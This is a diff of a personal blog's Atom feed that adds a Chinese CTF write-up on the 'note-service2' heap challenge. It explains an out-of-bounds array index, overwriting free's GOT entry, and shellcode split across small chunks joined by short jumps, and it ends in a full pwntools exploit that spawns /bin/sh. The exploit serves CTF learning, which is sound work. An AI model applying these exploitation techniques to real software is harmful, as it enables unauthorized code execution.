@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://https://czh11.github.io/</id>
     <title>Nono</title>
-    <updated>2020-11-18T11:32:09.345Z</updated>
+    <updated>2020-11-19T13:55:40.821Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://https://czh11.github.io/"/>
     <link rel="self" href="https://https://czh11.github.io/atom.xml"/>
@@ -11,12 +11,82 @@
     <icon>https://https://czh11.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Nono</rights>
     <entry>
-        <title type="html"><![CDATA[001]]></title>
-        <id>https://https://czh11.github.io/post/001/</id>
-        <link href="https://https://czh11.github.io/post/001/">
+        <title type="html"><![CDATA[ctfpwn 一道数组越界的堆题]]></title>
+        <id>https://https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/</id>
+        <link href="https://https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/">
         </link>
-        <updated>2020-11-18T11:31:37.000Z</updated>
-        <content type="html"><![CDATA[<p>第一次</p>
+        <updated>2020-11-19T13:44:23.000Z</updated>
+        <content type="html"><![CDATA[<p><img src="https://https://czh11.github.io//post-images/1605793554457.png" alt="" loading="lazy"><br>
+没有限制v1的范围，导致数组的下标可以为任意值，造成数组越界。<br>
+<img src="https://https://czh11.github.io//post-images/1605793729793.jpg" alt="" loading="lazy"><br>
+没有开启NX，堆栈可执行，所以可以把shellcode写在堆上，堆申请的大小最大为8，所以要把shellcode写在多个堆块上，</p>
+<figure data-type="image" tabindex="1"><img src="https://https://czh11.github.io//post-images/1605793839389.jpg" alt="" loading="lazy"></figure>
+<p>同时写进去的最后一个字节会被置0，因此正真能写的只有7个字节。</p>
+<p>综上，我们可以申请任意地址的8个字节改为我们申请的堆块的指针，这里修改got表的内容让它跳转到我们shellcode的地址。</p>
+<p>Jmp short xxxx指令占用2字节，这条指令使用的是相对当前指令的下一条指令位置寻址的 。</p>
+<figure data-type="image" tabindex="2"><img src="https://https://czh11.github.io//post-images/1605793857686.jpg" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://https://czh11.github.io//post-images/1605793900510.jpg" alt="" loading="lazy"></figure>
+<pre><code>#!/usr/bin/env python2
+#-*- coding:utf-8 -*
+from pwn import *
+p=process(&quot;./note-service2&quot;)
+#p=remote(&quot;220.249.52.133&quot;,42490)
+elf=ELF(&quot;./note-service2&quot;)
+print(hex(elf.got['free']))
+context.log_level='debug'
+context.arch='amd64'
+def add(index,content):
+    p.recvuntil('your choice&gt;&gt;')
+    p.sendline('1')
+    p.recvuntil('index')
+    p.sendline(str(index))
+    p.recvuntil('size')
+    p.sendline(str(8))    
+    p.recvuntil('content')
+    p.send(content)
+
+def delete(index):
+	p.recvuntil('your choice&gt;&gt;')
+	p.sendline('4')
+	p.recvuntil('index:')
+	p.sendline(str(index))
+
+&quot;&quot;&quot;
+;64位系统调用
+mov rdi,xxxx;&quot;/bin/sh&quot;的地址
+mov rax,0x3b;execve系统调用号
+mov rsi,0
+mov rdx,0
+sycall
+&quot;&quot;&quot;
+gdb.attach(p)
+add(0,'/bin/sh')# 向第一个chunk中写入/bin/sh
+add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xeb\x19')
+#把got表中free函数的指针覆盖为第二个chunk的指针
+#然后在第二个chunk中写入
+#xor rsi,rsi
+#nop
+#nop
+#jmp 0x19
+add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')
+#mov rax,0x3b的机器码站7个字节,而push 0x3b;pop rax只占3个字节
+#push 0x3b
+#pop rax
+#nop
+#nop
+#jmp 0x19
+add(2,asm('xor rdx,rdx')+'\x90\x90\xeb\x19')
+#
+add(3,asm('syscall')+'\x90'*5)
+
+delete(0)
+#因为got表的free函数的地址被修改为我们第二个chunk的地址了,
+#所以我们调用free的时候就跳转到了我们第二个chunk的数据段,
+#因为这是一个64位程序的函数调用，所以程序会把我们第一个chunk的数据区的指针放入RDI;
+#在64位的程序中,当参数少于7个时,参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。
+
+p.interactive()
+</code></pre>
 ]]></content>
     </entry>
 </feed>
